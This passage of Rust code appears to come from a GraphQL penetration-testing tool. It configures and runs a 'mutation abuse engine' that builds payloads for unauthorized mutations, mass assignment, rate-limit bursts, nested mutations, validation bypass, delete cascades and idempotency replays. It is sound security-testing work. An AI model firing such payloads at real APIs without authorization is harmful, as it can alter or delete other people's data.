    let is_update = IDEMPOTENT_MUTATIONS.contains(&mutation_name);
    let is_create = NON_IDEMPOTENT_MUTATIONS.contains(&mutation_name);

    let expected = if is_update {
        IdempotencyExpectation::SameResult
    } else if is_create {
        IdempotencyExpectation::DuplicateCreation
    } else {
        IdempotencyExpectation::SameResult
    };

    tests.push(IdempotencyTest {
        query: query.clone(),
        replay_count: effective_replays,
        expected_behavior: expected,
        mutation_name: mutation_name.to_string(),
        idempotency_key: None,
    });

    tests.push(IdempotencyTest {
        query: query.clone(),
        replay_count: effective_replays,
        expected_behavior: IdempotencyExpectation::KeyBasedDedup,
        mutation_name: mutation_name.to_string(),
        idempotency_key: Some("test-idempotency-key-001".to_string()),
    });

    tests.push(IdempotencyTest {
        query,
        replay_count: 2,
        expected_behavior: IdempotencyExpectation::RejectDuplicate,
        mutation_name: mutation_name.to_string(),
        idempotency_key: Some("duplicate-key-test".to_string()),
    });

    tests
}

// ─── Aggregate Engine ────────────────────────────────────────────────────────

/// Full result from the mutation abuse engine.
#[derive(Debug)]
pub struct MutationAbuseResult {
    /// Mutation enumeration results.
    pub enumeration: MutationEnumerationResult,
    /// Unauthorized access test cases.
    pub unauthorized_tests: Vec<UnauthorizedMutationTest>,
    /// Mass-assignment payloads.
    pub mass_assignment_payloads: Vec<MassAssignmentPayload>,
    /// Rate-limit test cases.
    pub rate_limit_tests: Vec<RateLimitTest>,
    /// Nested mutation payloads.
    pub nested_payloads: Vec<NestedMutationPayload>,
    /// Input validation bypass tests.
    pub input_validation_tests: Vec<InputValidationTest>,
    /// Delete cascade test cases.
    pub delete_cascade_tests: Vec<DeleteCascadeTest>,
    /// Idempotency test cases.
    pub idempotency_tests: Vec<IdempotencyTest>,
    /// Total number of generated attack payloads.
    pub total_payload_count: usize,
}

/// Configuration for the mutation abuse engine.
#[derive(Debug, Clone)]
pub struct MutationAbuseConfig {
    /// Enable mutation enumeration.
    pub enable_enumeration: bool,
    /// Enable unauthorized mutation access tests.
    pub enable_unauthorized: bool,
    /// Enable mass-assignment testing.
    pub enable_mass_assignment: bool,
    /// Enable rate-limit testing.
    pub enable_rate_limit: bool,
    /// Enable nested mutation abuse.
    pub enable_nested: bool,
    /// Enable input validation bypass.
    pub enable_input_validation: bool,
    /// Enable delete cascade testing.
    pub enable_delete_cascade: bool,
    /// Enable idempotency testing.
    pub enable_idempotency: bool,
    /// Burst count for rate-limit tests.
    pub rate_limit_burst: usize,
    /// Max nesting depth for nested mutations.
    pub nested_depth: usize,
    /// Replay count for idempotency tests.
    pub idempotency_replays: usize,
}

impl Default for MutationAbuseConfig {
    fn default() -> Self {
        Self {
            enable_enumeration: true,
            enable_unauthorized: true,
            enable_mass_assignment: true,
            enable_rate_limit: true,
            enable_nested: true,
            enable_input_validation: true,
            enable_delete_cascade: true,
            enable_idempotency: true,
            rate_limit_burst: 20,
            nested_depth: 8,
            idempotency_replays: 5,
        }
    }
}

/// Run the full mutation abuse engine.
///
/// Generates attack payloads for all 8 mutation abuse patterns. This is a
/// payload generation engine only — no network requests are made. The caller
/// sends generated payloads and processes responses.
pub fn run_mutation_abuse_engine(
    config: &MutationAbuseConfig,
    enumeration_responses: &[(&str, &str)],
    target_mutations: &[(&str, &str)],
) -> MutationAbuseResult {
    let enumeration = if config.enable_enumeration {
        process_mutation_enumeration(enumeration_responses)
    } else {
        MutationEnumerationResult {
            discovered_mutations: Vec::new(),
            suggested_mutations: HashMap::new(),
            unique_count: 0,
            probes: Vec::new(),
        }
    };

    let effective_mutations: Vec<(&str, &str)> = if target_mutations.is_empty() {
        enumeration
            .discovered_mutations
            .iter()
            .map(|m| (m.as_str(), ""))
            .collect()
    } else {
        target_mutations.to_vec()
    };

    let unauthorized_tests = if config.enable_unauthorized {
        generate_unauthorized_mutation_suite(&effective_mutations)
    } else {
        Vec::new()
    };

    let mass_assignment_payloads = if config.enable_mass_assignment {
        effective_mutations
            .iter()
            .flat_map(|(name, _)| generate_mass_assignment_payloads(name, &[]))
            .collect()
    } else {
        Vec::new()
    };

    let rate_limit_tests = if config.enable_rate_limit {
        effective_mutations
            .iter()
            .flat_map(|(name, args)| generate_rate_limit_tests(name, args, config.rate_limit_burst))
            .collect()
    } else {
        Vec::new()
    };

    let mutation_names: Vec<&str> = effective_mutations.iter().map(|(name, _)| *name).collect();

    let nested_payloads = if config.enable_nested && !mutation_names.is_empty() {
        generate_nested_mutation_payloads(&mutation_names, config.nested_depth)
    } else {
        Vec::new()
    };

    let input_validation_tests = if config.enable_input_validation {
        effective_mutations
            .iter()
            .flat_map(|(name, _)| generate_input_validation_tests(name, "input"))
            .collect()
    } else {
        Vec::new()
    };

    let delete_cascade_tests = if config.enable_delete_cascade {
        generate_delete_cascade_tests(&[])
    } else {
        Vec::new()
    };

    let idempotency_tests = if config.enable_idempotency {
        effective_mutations
            .iter()
            .flat_map(|(name, args)| {
                generate_idempotency_tests(name, args, config.idempotency_replays)
            })
            .collect()
    } else {
        Vec::new()
    };

    let total_payload_count = enumeration.probes.len()
        + unauthorized_tests.len()
        + mass_assignment_payloads.len()
        + rate_limit_tests
            .iter()
            .map(|t| t.queries.len())
            .sum::<usize>()
        + nested_payloads.len()
        + input_validation_tests.len()
        + delete_cascade_tests.len()
        + idempotency_tests.len();

    MutationAbuseResult {
        enumeration,
        unauthorized_tests,
        mass_assignment_payloads,
        rate_limit_tests,
        nested_payloads,
        input_validation_tests,
        delete_cascade_tests,
        idempotency_tests,
        total_payload_count,
    }
}
